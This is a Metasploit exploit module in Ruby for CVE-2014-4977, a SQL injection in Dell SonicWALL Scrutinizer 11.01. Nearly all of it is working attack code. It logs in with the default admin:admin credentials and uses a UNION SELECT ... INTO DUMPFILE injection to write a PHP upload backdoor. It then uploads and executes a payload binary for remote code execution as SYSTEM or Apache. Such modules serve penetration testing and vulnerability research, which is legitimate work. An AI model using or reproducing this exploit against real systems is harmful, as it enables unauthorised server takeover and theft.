# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
  include Msf::Exploit::EXE
 
  WINDOWS = /^win/i
  LINUX   = /linux/i
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Dell SonicWALL Scrutinizer 11.01 methodDetail SQL Injection",
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability found in Dell SonicWALL Scrutinizer. The methodDetail
        parameter in exporters.php allows an attacker to write arbitrary files to the file system
        with an SQL Injection attack, and gain remote code execution under the context of SYSTEM
        for Windows, or as Apache for Linux.
 
        Authentication is required to exploit this vulnerability, but this module uses
        the default admin:admin credential.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;bperry&#039;, # Original discovery, PoC, and Metasploit module
          &#039;sinn3r&#039;  # Metasploit module for native support
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2014-4977&#039; ],
          [ &#039;BID&#039;, &#039;68495&#039; ],
          [ &#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2014/Jul/44&#039; ],
          [ &#039;URL&#039;,&#039;https://gist.github.com/brandonprry/76741d9a0d4f518fe297&#039; ]
        ],
      &#039;Arch&#039;           => [ ARCH_X86 ],
      &#039;Platform&#039;       => [ &#039;win&#039;, &#039;linux&#039; ],
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;, {} ],
          [
            &#039;Dell SonicWALL Scrutinizer 11.01 on Windows&#039;,
            {
              &#039;Arch&#039;     => ARCH_X86,
              &#039;Platform&#039; => &#039;win&#039;,
            }
          ],
          [
            &#039;Dell SonicWALL Scrutinizer 11.01 Linux Appliance&#039;,
            {
              &#039;Arch&#039;     => ARCH_X86,
              &#039;Platform&#039; => &#039;linux&#039;
            }
          ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Jul 24 2014&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, "Base Application path", "/" ]),
        OptString.new(&#039;USERNAME&#039;, [ true,  &#039;The username to authenticate as&#039;, &#039;admin&#039; ]),
        OptString.new(&#039;PASSWORD&#039;, [ true,  &#039;The password to authenticate with&#039;, &#039;admin&#039; ])
      ], self.class)
  end
 
 
  # Prints a message with the target&#039;s IP and port.
  #
  # @param msg [String] Message to print.
  # @return [void]
  def print_status(msg=&#039;&#039;)
    super("#{peer} - #{msg}")
  end
 
 
  # Prints an error message with the target&#039;s IP and port.
  #
  # @param msg [String] Message to print.
  # @return [void]
  def print_error(msg=&#039;&#039;)
    super("#{peer} - #{msg}")
  end
 
 
  # Pads NULL columns for a SQL injection string.
  #
  # @param n [Fixnum] Number of nulls
  # @return [String]
  def pad_null(n)
    padding = []
 
    n.times do
      padding << &#039;NULL&#039;
    end
 
    padding * &#039;,&#039;
  end
 
 
  # Checks (explicitly) the target for the vulnerability. To be able to check this, a
  # valid username/password is required.
  #
  # @return [void]
  def check
    begin
      res = do_login
    rescue Msf::Exploit::Failed => e
      vprint_error(e.message)
      return Exploit::CheckCode::Unknown
    end
 
    uid = res[&#039;userid&#039;]
    sid = res[&#039;sessionid&#039;]
    pattern = Rex::Text.rand_text_alpha(10)
    sqli_str = "-6045 UNION ALL SELECT &#039;#{pattern}&#039;,#{pad_null(19)}"
    res = do_sqli(sqli_str, sid, uid).get_json_document
    return Exploit::CheckCode::Vulnerable if res[&#039;id&#039;].to_s == pattern
 
    Exploit::CheckCode::Safe
  end
 
 
  # Returns the OS information by using @@version_compile_os.
  #
  # @param sid [String] Session ID.
  # @param uid [String] User ID.
  # @return [String] The OS information.
  def get_os(sid, uid)
    sqli_str = "-6045 UNION ALL SELECT @@version_compile_os,#{pad_null(19)}"
    res = do_sqli(sqli_str, sid, uid).get_json_document
    res[&#039;id&#039;]
  end
 
 
  # Returns target&#039;s d4d directory path that will be used to upload our malicious files.
  #
  # @param os [String] OS information.
  # @return [String]
  def get_d4d_path(os)
    case os
    when WINDOWS
      # On Windows, the full d4d path looks something like this:
      # C:\Program Files\Scrutinizer\html\d4d
      &#039;../../html/d4d&#039;
    when LINUX
      # On the Linux appliance, the d4d path looks exactly like this:
      &#039;/home/plixer/scrutinizer/html/d4d&#039;
    end
  end
 
 
  # Logs into Dell SonicWALL Scrutinizer.
  #
  # @return [Hash] JSON response.
  def do_login
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri, &#039;/cgi-bin/login.cgi&#039;),
      &#039;vars_get&#039; => {
        &#039;name&#039; => datastore[&#039;USERNAME&#039;],
        &#039;pwd&#039; => datastore[&#039;PASSWORD&#039;]
      }
    })
 
    unless res
      fail_with(Failure::Unknown, &#039;The connection timed out while attempting to log in.&#039;)
    end
 
    res = res.get_json_document
 
    if res[&#039;noldapnouser&#039;]
      fail_with(Failure::NoAccess, "Username &#039;#{datastore[&#039;USERNAME&#039;]}&#039; is incorrect.")
    elsif res[&#039;loginfailed&#039;]
      fail_with(Failure::NoAccess, "Password &#039;#{datastore[&#039;PASSWORD&#039;]}&#039; is incorrect.")
    end
 
    report_cred(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])
 
    res
  end
 
 
  # Saves a valid username/password to database.
  #
  # @param username [String]
  # @param password [String]
  # @return [void]
  def report_cred(username, password)
    service_data = {
      address: rhost,
      port: rport,
      service_name: ssl ? &#039;https&#039; : &#039;http&#039;,
      protocol: &#039;tcp&#039;,
      workspace_id: myworkspace_id
    }
 
    credential_data = {
      module_fullname: self.fullname,
      origin_type: :service,
      username: username,
      private_data: password,
      private_type: :password
    }.merge(service_data)
 
    credential_core = create_credential(credential_data)
 
    login_data = {
      core: credential_core,
      last_attempted_at: DateTime.now,
      status: Metasploit::Model::Login::Status::SUCCESSFUL
    }.merge(service_data)
 
    create_credential_login(login_data)
  end
 
 
  # Injects malicious SQL string to the methodDetail parameter against the target machine.
  #
  # @param method_detail [String] Malicious SQL injection string.
  # @param sid [String] Session ID.
  # @param uid [String] User ID.
  # @return [Rex::Proto::Http::Response]
  def do_sqli(method_detail, sid, uid)
    res = send_request_cgi({
      &#039;uri&#039;      => normalize_uri(target_uri, &#039;/d4d/exporters.php&#039;),
      &#039;vars_get&#039; => { &#039;methodDetail&#039;=> method_detail },
      &#039;cookie&#039;   => "cookiesenabled=1;sessionid=#{sid};userid=#{uid}"
    })
 
    unless res
      fail_with(Failure::Unknown, &#039;The connection timed out for exporters.php.&#039;)
    end
 
    res
  end
 
 
  # Returns a PHP backdoor that is to be uploaded onto the target machine.
  #
  # @param os [String] Target OS information.
  # @param target_path [String]
  # @return [String] PHP backdoor
  def get_php_backdoor(os)
    case os
    when WINDOWS
      chmod_code = %Q|chmod($bname, 0777);|
      exec_code = %Q|exec($bname);|
    when LINUX
      chmod_code = %Q|chmod("./" . $bname, 0777);|
      exec_code = %Q|exec("./" . $bname);|
    end
 
    %Q|<?php
    $bname = basename( $_FILES[&#039;uploadedfile&#039;][&#039;name&#039;]);
    $target_path = "./" . $bname;
    move_uploaded_file($_FILES[&#039;uploadedfile&#039;][&#039;tmp_name&#039;], $target_path);
    #{chmod_code}
    #{exec_code}
    ?>
    |.gsub(/\x20{4}/, &#039; &#039;)
  end
 
 
  # Uploads the executable payload via malicious PHP backdoor.
  #
  # @param backdoor_fname [String] Name of the backdoor
  # @param payload_fname [String] Name of the executable payload
  # @return [void]
  def upload_payload(backdoor_fname, payload_fname)
    p = generate_payload_exe(
      code: payload.encoded,
      platform: @my_target.platform,
      arch: @my_target.arch
    )
 
    print_status("Uploading #{payload_fname} (#{p.length} bytes)...")
 
    post_data = Rex::MIME::Message.new
    post_data.add_part(
      p,
      &#039;application/octet-stream&#039;,
      &#039;binary&#039;,
      "form-data; name=\"uploadedfile\"; filename=\"#{payload_fname}\""
    )
    data = post_data.to_s
 
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri, "/d4d/#{backdoor_fname}"),
      &#039;ctype&#039;  => "multipart/form-data; boundary=#{post_data.bound}",
      &#039;data&#039;   => data
    })
 
    unless res
      # Here we are not using fail_with, because when we get a session, it seems to be creating
      # the same effect as connection hanging... and then eventually times out. If that
      # happens, a fail_with() can cause msfconsole to believe there is no session created.
      vprint_status(&#039;Connection timed out while uploading payload.&#039;)
      return
    end
 
    if res.code == 404
      fail_with(Failure::Unknown, "Server returned 404 for #{backdoor_fname}.")
    end
  end
 
 
  # Uploads the PHP backdoor onto the target machine. The reason of using a PHP backdoor to upload
  # is because our SQL injection is in a GET method, and Apache has a max length of 8190 bytes,
  # which is bad for some built-in or custom payloads.
  #
  # @param opts [Hash]
  # @option opts [String] :d4d_path
  # @option opts [String] :backdoor_fname
  # @option opts [String] :payload_fname
  # @option opts [String] :sid
  # @option opts [String] :uid
  # @option opts [String] :os
  # @return [void]
  def upload_php_backdoor(opts)
    d4d_path       = opts[:d4d_path]
    backdoor_fname = opts[:backdoor_fname]
    payload_fname  = opts[:payload_fname]
    sid            = opts[:sid]
    uid            = opts[:uid]
    os             = opts[:os]
 
    print_status("Injecting a PHP upload backdoor (#{backdoor_fname})...")
    hex_backdoor = get_php_backdoor(os).unpack("H*")[0]
    sqli_str = "-6045 UNION ALL SELECT 0x#{hex_backdoor},#{pad_null(19)} INTO DUMPFILE &#039;#{d4d_path}/#{backdoor_fname}&#039; #"
    do_sqli(sqli_str, sid, uid)
  end
 
 
  # Attempts a SQL injection attack against the target machine.
  #
  # @param os [String] OS information.
  # @param sid [String] Session ID.
  # @param uid [String] User ID.
  # @return [void]
  def do_backdoor_sqli(os, sid, uid)
    backdoor_fname = "#{Rex::Text.rand_text_alpha(6)}.php"
    payload_fname  = Rex::Text.rand_text_alpha(5)
    payload_fname << &#039;.exe&#039; if @my_target[&#039;Platform&#039;].match(WINDOWS)
    d4d_path       = get_d4d_path(os)
 
    register_files_for_cleanup(backdoor_fname, payload_fname)
 
    opts = {
      d4d_path: d4d_path,
      backdoor_fname: backdoor_fname,
      payload_fname: payload_fname,
      sid: sid,
      uid: uid,
      os: os
    }
 
    upload_php_backdoor(opts)
    upload_payload(backdoor_fname, payload_fname)
  end
 
 
  # Tries to set the target. If the user manually set one, then avoid automatic target.
  #
  # @param os [String] OS information.
  # @return [void]
  def try_set_target(os)
    @my_target = target if target != targets[0]
    case os
    when WINDOWS
      @my_target = targets[1]
    when LINUX
      @my_target = targets[2]
    else
      fail_with(Failure::NoTarget, &#039;Unsupported target&#039;)
    end
  end
 
 
  # Exploits the target machine. To do this, first we must log into the system in order to obtain
  # the user ID and session ID. After logging in, we can ask the vulnerable code to upload a
  # malicious PHP backdoor, and then finally use that backdoor to upload and execute our payload.
  def exploit
    res = do_login
    uid = res[&#039;userid&#039;]
    sid = res[&#039;sessionid&#039;]
    os = get_os(sid, uid)
    print_status("Detected OS information: #{os}")
    try_set_target(os)
    do_backdoor_sqli(os, sid, uid)
  end
 
end

